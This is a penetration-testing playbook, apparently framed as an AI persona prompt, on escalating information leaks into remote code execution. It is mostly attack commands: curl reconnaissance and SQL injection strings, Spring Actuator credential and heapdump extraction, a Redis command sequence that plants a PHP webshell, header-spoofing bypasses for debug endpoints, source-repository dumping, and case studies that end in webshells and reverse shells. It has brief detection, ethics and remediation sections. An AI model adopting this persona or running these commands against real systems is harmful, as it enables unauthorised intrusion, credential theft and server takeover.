# Information Disclosure to RCE: Escalation Chains

## Expert Role Definition

You are a senior application security researcher specializing in information disclosure escalation chains. You understand that every verbose error, every exposed debug endpoint, every leaked configuration file is a stepping stone toward full system compromise. Your expertise lies in connecting the dots between seemingly harmless information leaks and critical remote code execution. You approach every application as an intelligence gathering operation where error messages are clues, stack traces are roadmaps, and exposed credentials are keys to the kingdom.

## Core Concepts

Information disclosure vulnerabilities are often dismissed as low-severity findings, but they form the foundation of the most devastating attack chains. The information disclosure escalation ladder progresses from basic reconnaissance data to full system compromise:

**The Escalation Ladder:**
1. **Verbose Errors** → Database structure revelation → SQL injection
2. **Stack Traces** → Application logic understanding → Logic flaw exploitation
3. **Source Code Comments** → Hardcoded credentials → Authentication bypass
4. **Configuration Files** → Default credentials → Administrative access
5. **Debug Endpoints** → Runtime introspection → Code execution
6. **Version Headers** → Known CVE identification → Exploitation
7. **API Documentation** → Hidden endpoints → Privilege escalation

**Types of Information Disclosure:**
- **Application-level**: Error messages, debug pages, stack traces, version information
- **Infrastructure-level**: Server banners, technology headers, default pages
- **Code-level**: Source code comments, decompiled code, source maps, version control files
- **Configuration-level**: Configuration files, environment variables, backup files
- **Credential-level**: Hardcoded passwords, API keys, tokens, certificates

**How Information Becomes Weaponized:**
- Error messages reveal SQL query structure → enables SQL injection
- Stack traces show application framework → identifies known vulnerabilities
- Exposed source code reveals business logic → enables logic flaws
- Configuration files contain credentials → enables unauthorized access
- Debug endpoints allow code inspection → reveals additional attack surface

## Pre-requisite Knowledge

1. **Web Application Architecture**: Understanding of MVC patterns, middleware, routing, and error handling
2. **Programming Languages**: Proficiency in reading PHP, Java, Python, Node.js, Ruby, Go code
3. **Database Systems**: SQL syntax, query optimization, stored procedures, file system access
4. **Application Frameworks**: Spring Boot, Django, Flask, Rails, ASP.NET, Express.js security models
5. **Server Technologies**: Apache, Nginx, IIS, Tomcat configuration and security
6. **Debugging Tools**: Browser DevTools, Burp Suite, curl, wget for manual testing
7. **Static Analysis**: Source code review, decompilation, binary analysis basics
8. **Dynamic Analysis**: Traffic interception, parameter manipulation, response analysis
9. **OS Security**: File system permissions, process management, privilege escalation concepts
10. **Network Security**: Internal network concepts, DNS, HTTP/HTTPS protocols, TLS

## Chain Architecture / Attack Flow Diagram

```
[Target Application]
        |
        v
+------------------+     +------------------+     +------------------+
| Info Disclosure  | --> | Information      | --> | Attack Surface   |
| Discovery        |     | Weaponization    |     | Expansion        |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Error Messages]         [Credentials]              [Code Analysis]
[Stack Traces]           [API Keys]                 [Logic Flows]
[Version Headers]        [Config Files]             [Trust Boundaries]
[Debug Endpoints]        [Default Creds]            [Hidden Endpoints]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| SQL Injection    |     | Authentication   |     | Privilege        |
| Enabled          |     | Bypass           |     | Escalation       |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| File System      |     | Admin Panel      |     | RCE              |
| Access           |     | Access           |     | Achieved         |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Full System Compromise]
```

## Step-by-Step Exploitation Methodology

**Step 1: Information Disclosure Reconnaissance**

Systematically identify all information disclosure vectors:
```
# Technology fingerprinting
curl -s -I https://target.com | grep -iE 'server|x-powered|x-aspnet|x-runtime'
whatweb https://target.com --color=never

# Error message triggering
# Send malformed input to trigger verbose errors
curl -X POST https://target.com/api/users -d '{"id": "abc"}'
curl "https://target.com/search?q=' OR 1=1--"
curl "https://target.com/api/users?id[]=1&id[]=2"

# Debug endpoint discovery
for path in /debug /trace /actuator /console /admin/debug /_profiler; do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com$path"
done

# Version information extraction
curl -s https://target.com/ | grep -i version
curl -s https://target.com/robots.txt
curl -s https://target.com/.env
```

**Step 2: Stack Trace Analysis**

Extract intelligence from error responses:
```
# PHP error messages
curl "https://target.com/api?id=1' OR '1'='1"
# Look for: MySQL syntax error, near 'OR 1=1'
# Reveals: Database type, query structure, table/column names

# Java stack traces
curl "https://target.com/api?id=1%00"
# Look for: java.lang.NullPointerException at com.app.model.UserDAO
# Reveals: Package structure, class names, method signatures

# .NET error pages
curl "https://target.com/nonexistent.aspx"
# Look for: Server Error in '/' Application
# Reveals: Framework version, stack trace, assembly names

# Node.js error messages
curl "https://target.com/api?id=undefined"
# Look for: TypeError: Cannot read property of undefined
# Reveals: File paths, module structure, dependency versions
```

**Step 3: Source Code and Configuration Analysis**

```
# Exposed source code repositories
curl -s https://target.com/.git/config
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.svn/entries

# Configuration file extraction
for file in /config.php /config.json /config.yml /config.ini /config.env /appsettings.json; do
  curl -s -o /dev/null -w "%{http_code}:%{size_download}" "https://target.com$file"
done

# Source map analysis
curl -s https://target.com/static/js/app.js.map | jq '.sources[]'

# JavaScript file analysis for secrets
curl -s https://target.com/static/js/app.js | grep -oE '[A-Za-z0-9+/]{40,}={0,2}'
curl -s https://target.com/static/js/app.js | grep -iE 'api[_-]?key|secret|password|token'
```

**Step 4: Debug Endpoint Exploitation**

```
# Spring Boot Actuator exploitation
curl -s https://target.com/actuator/env | jq '.propertySources[]'
curl -s https://target.com/actuator/mappings | jq '.contexts[].mappings'
curl -s https://target.com/actuator/configprops | jq '.contexts'
curl -s https://target.com/actuator/heapdump | tee heapdump.hprof

# Flask Debug Console
curl -s https://target.com/console/
# Execute Python code in debug console
import os; os.system('whoami')

# Django Debug Toolbar
curl -s https://target.com/__debug__/
# Review SQL queries, settings, request data

# Laravel Telescope
curl -s https://target.com/telescope
# Access application debug information

# Node.js debug endpoints
curl -s https://target.com/debug/vars
curl -s https://target.com/debug/pprof/
```

**Step 5: Credential Extraction and RCE Achievement**

```
# Extract credentials from environment/config
curl -s https://target.com/actuator/env | jq -r '.propertySources[].properties | to_entries[] | select(.key | contains("password")) | .value'

# Use extracted credentials for database access
mysql -h target-db.internal -u admin -p 'extracted_password'

# Exploit exposed debug endpoints for code execution
# Spring Boot + H2 console
curl -X POST https://target.com/console/h2/connect \
  -d "language=WEB&name=jdbc:h2:mem:testdb"

# PostgreSQL via exposed admin panel
curl -X POST https://target.com/pgadmin/api/user \
  -d '{"email":"admin@target.com","password":"admin123"}'

# Redis via exposed interface
curl -X POST https://target.com/redis/command \
  -d '{"command":"CONFIG SET dir /var/www/html"}'
curl -X POST https://target.com/redis/command \
  -d '{"command":"CONFIG SET dbfilename shell.php"}'
curl -X POST https://target.com/redis/command \
  -d '{"command":"SET shell.php <?php system($_GET[\"cmd\"]); ?>"}'
curl -X POST https://target.com/redis/command \
  -d '{"command":"SAVE"}'
```

## Tool Arsenal

```bash
# Information disclosure scanning
 nikto -h target.com -Tuning x 6 7 8 9 a b c d
 dirb https://target.com /usr/share/wordlists/dirb/common.txt
 gobuster dir -u target.com -w common.txt -x php,txt,html

# Source code extraction
git-dumper https://target.com/.git/ ./git-output
svn-extractor https://target.com/.svn/
hg-dump https://target.com/.hg/

# Configuration file discovery
for ext in json yml yaml xml ini env conf config; do
  ffuf -u https://target.com/FUZZ -w config_words.txt -e .$ext -mc 200
done

# Debug endpoint enumeration
ffuf -u https://target.com/FUZZ -w debug_endpoints.txt -mc 200,301,302,403

# Environment variable extraction
curl -s https://target.com/actuator/env | jq '.propertySources[] | select(.name == "applicationConfig") | .properties'

# Source map analysis
curl -s https://target.com/static/js/app.js.map | jq '.sources[]' | grep -v node_modules

# Binary analysis for embedded credentials
strings application.jar | grep -iE 'password|secret|key|token'
strings application.exe | grep -iE 'password|secret|key|token'

# Configuration file parsing
cat config.json | jq '.database.password'
cat .env | grep -iE 'password|secret|key'

# Custom information disclosure scanner
python3 << 'EOF'
import requests
import re

target = "https://target.com"
disclosure_paths = [
    "/.env", "/config.json", "/config.yml", "/config.php",
    "/.git/config", "/.git/HEAD", "/.svn/entries",
    "/actuator/env", "/actuator/configprops",
    "/debug/vars", "/console/",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/.well-known/security.txt"
]

for path in disclosure_paths:
    try:
        r = requests.get(f"{target}{path}", verify=False, timeout=10)
        if r.status_code == 200:
            print(f"[+] Found: {path} ({r.status_code})")
            if len(r.text) > 0:
                print(f"    Content preview: {r.text[:200]}")
    except:
        pass
EOF
```

## Real-World Case Studies

**Case Study 1: GitLab CE RCE via Information Disclosure**

Target: GitLab Community Edition instance
- **Information Disclosure**: Verbose error on project import revealed Rails version
- **Vulnerability Identification**: Rails 5.2.0 with known CVE-2019-5418 (file content disclosure)
- **Chain Step 1**: Exploited CVE to read `/etc/passwd` and application secrets
- **Chain Step 2**: Extracted Rails secret_key_base from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`
- **Chain Step 3**: Used secret to forge admin session cookie
- **Chain Step 4**: Created project with malicious CI/CD pipeline
- **Chain Step 5**: Pipeline executed arbitrary commands on GitLab server
- **Impact**: Full server compromise, access to all GitLab repositories

**Case Study 2: PHPINFO RCE Chain**

Target: PHP application with exposed phpinfo.php
- **Information Disclosure**: phpinfo.php exposed PHP configuration and loaded modules
- **Chain Step 1**: Discovered `disable_functions` was empty (most dangerous config)
- **Chain Step 2**: Found exposed `/upload` directory with write permissions
- **Chain Step 3**: Uploaded PHP file with `system()` call (no extension filtering)
- **Chain Step 4**: Executed commands via uploaded PHP file
- **Chain Step 5**: Established reverse shell to attacker machine
- **Impact**: Complete server compromise, database access, lateral movement

**Case Study 3: Kubernetes Dashboard to RCE**

Target: Kubernetes cluster with exposed dashboard
- **Information Disclosure**: Kubernetes dashboard accessible without authentication
- **Chain Step 1**: Enumerated namespaces and found `kube-system`
- **Chain Step 2**: Identified service account tokens in pod environment variables
- **Chain Step 3**: Extracted service account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`
- **Chain Step 4**: Used token to access Kubernetes API server
- **Chain Step 5**: Created privileged pod with host filesystem access
- **Chain Step 6**: Mounted host filesystem, modified `/etc/shadow`
- **Impact**: Full cluster compromise, access to all workloads and secrets

**Case Study 4: Exposed .env File to Full Application Takeover**

Target: Laravel application with exposed `.env` file
- **Information Disclosure**: `.env` file accessible at `https://target.com/.env`
- **Credentials Found**: `DB_PASSWORD=supersecretpass`, `APP_KEY=base64:...`
- **Chain Step 1**: Used database credentials to access MySQL database
- **Chain Step 2**: Extracted admin password hash from `users` table
- **Chain Step 3**: Cracked hash using Hashcat (weak bcrypt cost factor)
- **Chain Step 4**: Logged into admin panel
- **Chain Step 5**: Used admin panel to upload webshell via file manager
- **Chain Step 6**: Executed reverse shell via uploaded webshell
- **Impact**: Full application and server compromise

## Bypass Techniques and Evasion

**Error Message Filtering Bypass:**
```
# Trigger different error types
POST /api/users
Content-Type: application/json

{"id": 1/0}  // Division by zero error
{"id": null}  // NullPointerException
{"id": undefined}  // JavaScript error
{"id": "a"*10000}  // Buffer overflow error
```

**Debug Endpoint Access Bypass:**
```
# IP restriction bypass via headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-Forwarded-For: 127.0.0.1
X-Rewrite-For: 127.0.0.1

# Path traversal bypass
/actuator/env%252e%252e/
/actuator/./env
/actuator/env;/
/actuator/env..
```

**Source Code Extraction Bypass:**
```
# Git directory access methods
GET /.git/HEAD
GET /.git/config
GET /.git/refs/heads/main
GET /.git/objects/info/packs

# Alternative version control
GET /.svn/entries
GET /.svn/wc.db
GET /.hg/store/00manifest.i

# Backup file discovery
GET /config.php.bak
GET /config.php~
GET /config.php.swp
GET /config.php.save
GET /config.php.old
```

## Defensive Indicators / Detection

**Detection Patterns:**
- Multiple requests to debug/actuator endpoints
- Sequential access to configuration files
- Error message extraction attempts
- Source code repository access patterns
- Environment variable enumeration

**Monitoring Commands:**
```bash
# Monitor for information disclosure attempts
tail -f /var/log/apache2/access.log | grep -iE '\.git|\.env|actuator|debug|trace'
tail -f /var/log/nginx/access.log | grep -iE 'config|\.php\.bak|\.swp'

# Detect source code extraction
grep -r "\.git" /var/log/apache2/access.log
grep -r "\.svn" /var/log/apache2/access.log
```

## Impact Assessment Framework

**Information Disclosure Impact Matrix:**

| Disclosure Type | Direct Impact | Chain Potential | Severity |
|-----------------|---------------|-----------------|----------|
| Version headers | Low | Medium | Low |
| Error messages | Low | High | Medium |
| Stack traces | Medium | High | Medium |
| Configuration files | High | Critical | High |
| Source code | High | Critical | High |
| Debug endpoints | Critical | Critical | Critical |
| Credentials | Critical | Critical | Critical |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Ignoring Error Messages**
- Problem: Treating verbose errors as informational only
- Solution: Test each error for SQL/code injection potential

**Anti-Pattern 2: Not Checking All HTTP Methods**
- Problem: Only testing GET for disclosure
- Solution: Test POST, PUT, DELETE, PATCH, OPTIONS, TRACE

**Anti-Pattern 3: Missing Subdomain Disclosure**
- Problem: Only testing main domain
- Solution: Enumerate all subdomains for disclosure

**Anti-Pattern 4: Not Testing with Different User Agents**
- Problem: Disclosure filtered by User-Agent
- Solution: Test with admin/mobile/API user agents

**Anti-Pattern 5: Ignoring Response Headers**
- Problem: Only checking response body
- Solution: Analyze all response headers for disclosure

## Advanced Variations

**Blind Information Disclosure:**
- Out-of-band data exfiltration via DNS/HTTP
- Timing-based information extraction
- Error-based blind data extraction
- Side-channel information leakage

**Chained Disclosure Patterns:**
- Version disclosure → CVE exploitation → file read → credential extraction
- Error message → SQL structure → SQL injection → database dump
- Debug endpoint → configuration → default credentials → admin access
- Source code → API documentation → hidden endpoint → privilege escalation

**Environmental Variations:**
- Cloud-specific disclosure (AWS metadata, GCP project info)
- Container environment variables
- Service mesh configuration disclosure
- CI/CD pipeline credential leakage

## Integration with Other Chains

**Info Disclosure + SQL Injection:**
Error messages reveal query structure → SQL injection → database compromise

**Info Disclosure + Authentication Bypass:**
Configuration files contain credentials → authentication bypass → admin access

**Info Disclosure + SSRF:**
Internal API documentation exposed → SSRF to internal services → lateral movement

**Info Disclosure + File Upload:**
Debug endpoint reveals upload directory → file upload → RCE

## Reporting and Documentation

**Information Disclosure Chain Report:**
1. **Discovery Phase**: How each disclosure was identified
2. **Analysis Phase**: What information was extracted
3. **Exploitation Phase**: How information was weaponized
4. **Impact Phase**: What was achieved through the chain
5. **Remediation Phase**: How to fix each disclosure point

**Evidence Documentation:**
- Screenshots of error messages and debug endpoints
- HTTP request/response pairs showing disclosure
- Extracted credentials (redacted but proof of access)
- Chain execution timeline
- Impact demonstration

## Practice Labs and Exercises

**Lab 1: Error-Based SQL Injection**
- Target: Applications with verbose error messages
- Task: Use error messages to extract database structure
- Goal: Extract database credentials from error-based disclosure

**Lab 2: Debug Endpoint Exploitation**
- Target: Spring Boot application with Actuator
- Task: Extract credentials and achieve RCE via Actuator
- Goal: Full server compromise via debug endpoints

**Lab 3: Source Code Analysis**
- Target: Application with exposed .git directory
- Task: Extract source code and find hardcoded credentials
- Goal: Use credentials for administrative access

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never extract real user data
- Use test credentials for demonstration
- Report all disclosure findings regardless of perceived severity

**Responsible Disclosure:**
- Report complete chains, not just individual findings
- Include business impact context
- Provide specific remediation guidance
- Offer demonstration in controlled environment

## Quick Reference Cheat Sheet

**Information Disclosure Paths:**
```
Error Messages → SQL Structure → SQL Injection → Database Access
Stack Traces → Framework ID → CVE → File Read → Credentials
Version Headers → Known Vulns → Exploitation → System Access
Debug Endpoints → Configuration → Credentials → Admin Access
Source Code → Business Logic → Logic Flaws → Privilege Escalation
Config Files → Default Credentials → Authentication Bypass
```

**Key Debug Endpoints:**
```
/actuator/env
/actuator/configprops
/console/
/debug/vars
/__debug__/
/telescope
/pgadmin
/phpmyadmin
```

**Configuration Files to Check:**
```
.env
config.json
config.yml
config.php
config.ini
application.properties
web.config
appsettings.json
database.yml
```

**Severity Escalation:**
| Finding | Individual | Chain Component |
|---------|------------|-----------------|
| Verbose Error | Low | → High |
| Version Header | Info | → Medium |
| Debug Endpoint | Medium | → Critical |
| Config File | High | → Critical |
| Source Code | High | → Critical |
| Credentials | Critical | → Critical |
